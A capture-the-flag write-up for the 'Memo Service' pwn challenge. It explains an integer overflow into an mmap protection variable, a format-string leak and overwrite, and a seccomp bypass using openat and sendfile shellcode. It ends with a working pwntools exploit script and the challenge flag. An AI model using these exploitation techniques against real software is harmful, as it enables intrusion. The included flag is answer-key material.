# Memo Service writeup

## Description

Our company has just installed a new program that helps employees to remember things rather than use sticky notes.

`$ nc something.challenge.cr3c.tf 1337`

**author**: Lio

## Overflow the proc variable

The program calls `scanf()` with a format `%ld` into a variable `n` with type int.

```c
int n; // [rsp+10h] [rbp-30h] BYREF
int prot; // [rsp+14h] [rbp-2Ch]
/*...*/
__isoc99_scanf("%ld", &n);
```

We can utilize this to make our input number overflow into the variable next to `n`, which is `proc`, thus making `mmap()` return a memory region with the exec permission.

## Leaking mmap address

The 2nd vulnerability is the call to `sprintf()` with the two arguments being a global variable `employee` and our input buffer `s`. The `employee` variable will be printed out later.

```c
char s[24];
/*...*/
sprintf(employee, s);
/*...*/
printf("Thank you %s for using our service!\n", employee);
```

Therefore we can use format strings vulnerability to leak data on the stack, specifically the address returned by `mmap()`, which is the `passcode` variable we need for execution of the beta feature.

## Getting the beta access

Since the `employee` variable is located right above the `is_beta` variable. We can gain this information by inspecting the memory.

```
.bss:0000000000004050         public employee
.bss:0000000000004050 ; char employee[20]
.bss:0000000000004050 employee db 14h dup(?)                  ; DATA XREF: main+12F↑o
.bss:0000000000004050                                         ; main+17E↑o
.bss:0000000000004064         public is_beta
.bss:0000000000004064 is_beta dd ?                            ; DATA XREF: main+202↑r
```

We can make use of the previously mentioned format strings vulnerability to print a lot of characters into the `employee` variable and, as a result, overflow the `is_beta` variable.

## Bypass seccomp with ORW alternative

From the `beta_setup()` function, the program forbids us from using the syscall to `open`, `read`, `write`, `execve`, and `execveat.`

```c
__int64 beta_setup()
{
    __int64 v1; // [rsp+8h] [rbp-8h]

    v1 = seccomp_init(0x7FFF0000LL);
    if ( !v1 )
    {
        puts("Failed to initialize seccomp filter.");
        exit(1);
    }

    seccomp_rule_add(v1, 0LL, 0x3BLL, 0LL);
    seccomp_rule_add(v1, 0LL, 0x142LL, 0LL);
    seccomp_rule_add(v1, 0LL, 2LL, 0LL);
    seccomp_rule_add(v1, 0LL, 0LL, 0LL);
    seccomp_rule_add(v1, 0LL, 1LL, 0LL);
    return seccomp_load(v1);
}
```

There's one way we can get around this: by using two other syscalls, which are `openat` and `sendfile`.

The `openat` syscall can be used to open a file with an absolute path.

```c
openat(int dfd, const char *filename, int flags, int mode)
```

And the `sendfile` is used to send data from one file descriptor to another, which we can use to send data from the flag file we just open using `openat` syscall to the file descriptor 1 (stdout).

```c
sendfile(int out_fd, int in_fd, off_t *offset, size_t count)
```

## PoC

```py
from pwn import *

context.binary = exe = ELF('chal')

io = remote('127.0.0.1', 1337)

io.sendlineafter(b': ', str(0x700000100).encode())
io.sendlineafter(b': ', b'%8$p%10c')

shellcode = shellcraft.openat(0, "/flag", 0, 0)
shellcode += shellcraft.sendfile(1, 'rax', 0, 50)
payload = asm(shellcode)
io.sendlineafter(b': ', payload)

io.recvuntil(b'0x')
passcode = int(io.recvuntil(b' '), 16)
io.sendlineafter(b': ', b'y')
io.sendlineafter(b': ', str(passcode).encode())

print(io.recvuntil(b"}"))

exit(0)

# cr3{b3t4_5t1LL_1n_d3v3l0pm3nt}
```
